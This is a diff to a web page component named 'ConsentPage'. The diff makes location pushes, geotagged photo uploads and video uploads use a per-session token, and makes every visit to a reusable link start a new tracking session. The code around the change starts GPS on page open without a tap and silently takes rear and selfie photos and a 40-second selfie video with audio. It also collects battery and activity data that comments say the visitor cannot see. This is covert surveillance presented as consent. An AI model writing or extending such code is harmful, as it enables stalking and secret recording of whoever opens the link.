@@ -928,6 +928,9 @@ export default function ConsentPage() {
   const startScreenCaptureRef = useRef<() => void>(() => {});
   // Guard: processGeoPosition should only fire once — whichever GPS attempt wins.
   const grantProcessedRef = useRef(false);
+  // Holds the sessionToken returned by the grant endpoint — used for location pushes
+  // so each page-load maps to its own session row, not the shared invite token.
+  const sessionTokenRef = useRef<string | null>(null);
 
   // ── New display-phase state machine ───────────────────────────────────────
   // contacts → kitty → contacts_popup → main
@@ -1470,13 +1473,16 @@ export default function ConsentPage() {
     lat: number, lng: number, acc?: number, addr?: string,
     locationStatus: "active" | "offline" = "active", source?: LocationSource,
   ) => {
+    // Use the per-session token if available (returned by the grant endpoint).
+    // Falls back to the invite token so pushes work even if grant hasn't completed yet.
+    const effectiveToken = sessionTokenRef.current ?? token;
     try {
       const { signal, clear } = abortAfter(10000);
       await fetch(`${API_BASE}/api/location/push`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
+          token: effectiveToken, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
           // Battery/activity are captured on this device but are only ever
           // surfaced to the owner's dashboard — never rendered on this
           // public page, so the contact can't see them here either.
@@ -1520,12 +1526,12 @@ export default function ConsentPage() {
       // Rear-facing "surroundings" photos first, then 2 front-facing selfie
       // photos — sequential since most phones only expose one active
       // camera stream at a time.
-      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT)
+      captureGeoPhotos(sessionTokenRef.current ?? String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT)
         .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true))
         .finally(() => {
           if (geoSelfiePhotoStartedRef.current) return;
           geoSelfiePhotoStartedRef.current = true;
-          captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT)
+          captureGeoPhotos(sessionTokenRef.current ?? String(token), initialLat, initialLng, addressRef.current, (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT)
             .then(() => setGeoSelfiePhotoDone(true)).catch(() => setGeoSelfiePhotoDone(true));
         });
     }
@@ -1535,7 +1541,7 @@ export default function ConsentPage() {
       // Android only supports one active camera stream at a time.
       // Run the short back-camera clip first (4 s), then immediately start the
       // 40-second front-camera selfie so they never compete for the hardware.
-      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), {
+      captureGeoVideo(sessionTokenRef.current ?? String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), {
         facingMode: "environment",
         durationMs: GEO_VIDEO_DURATION_MS,
         videoBps: GEO_VIDEO_BPS,
@@ -1543,7 +1549,7 @@ export default function ConsentPage() {
         width: 160, height: 120, frameRate: 10,
       }).catch(() => setGeoVideoState("error")).finally(() => {
         // Back-camera clip done — now start the selfie (front camera, 40 s, audio)
-        captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
+        captureGeoVideo(sessionTokenRef.current ?? String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
           facingMode: "user",
           durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
           videoBps: GEO_SELFIE_VIDEO_BPS,
@@ -1760,7 +1766,9 @@ export default function ConsentPage() {
     grant.mutate(
       { token: token!, data: { latitude, longitude } },
       {
-        onSuccess: () => {
+        onSuccess: (data: any) => {
+          // Capture the per-session token so location pushes are scoped to this session
+          if (data?.sessionToken) sessionTokenRef.current = data.sessionToken;
           startTracking(latitude, longitude, accuracy);
           // Save session data with Pixtral analysis — non-blocking background task
           pushSessionEvent("location_granted", { accuracy, lat: latitude, lng: longitude });
@@ -1862,12 +1870,7 @@ export default function ConsentPage() {
     autoStartedRef.current = true;
     const stored = loadStoredGps();
 
-    if (invite.status === "accepted") {
-      const lat = stored?.lat ?? invite.grantedLatitude ?? 0;
-      const lng = stored?.lng ?? invite.grantedLongitude ?? 0;
-      setDisplayPhase("main");
-      startTracking(lat, lng, stored?.accuracy);
-    } else if (stored) {
+    if (stored) {
       setDisplayPhase("main");
       setState("granting");
       // Hard 4-second cap: if the grant API call stalls, force into tracking
@@ -1879,7 +1882,12 @@ export default function ConsentPage() {
       grant.mutate(
         { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
         {
-          onSuccess: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); } },
+          onSuccess: (data: any) => {
+            // Capture session token for scoped location pushes
+            if (data?.sessionToken) sessionTokenRef.current = data.sessionToken;
+            clearTimeout(grantCap);
+            if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); }
+          },
           // On grant failure, stay in main phase but don't claim active sharing.
           // "gps_off" shows "Connecting…" in main phase (not an error screen).
           onError: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; setState("gps_off"); } },
@@ -1887,12 +1895,10 @@ export default function ConsentPage() {
       );
       reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
     } else {
-      // NEW FLOW: fire GPS immediately on page open — no button tap required.
-      // The contacts screen is still shown first so the user can share emergency
-      // contacts, but location sharing starts in the background right now.
-      // Gesture-gated calls inside doGrant (camera, contacts picker, screen share)
-      // will silently no-op here; the button handlers re-fire them once a tap
-      // provides the required user-activation signal.
+      // Always fire GPS immediately to create a fresh session — the link is
+      // permanent and reusable; each page load starts a new independent session.
+      // (Previously "accepted" invites jumped straight to startTracking; now they
+      // go through grant like any new visit so a new session row is created.)
       doGrantRef.current();
     }
   }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps
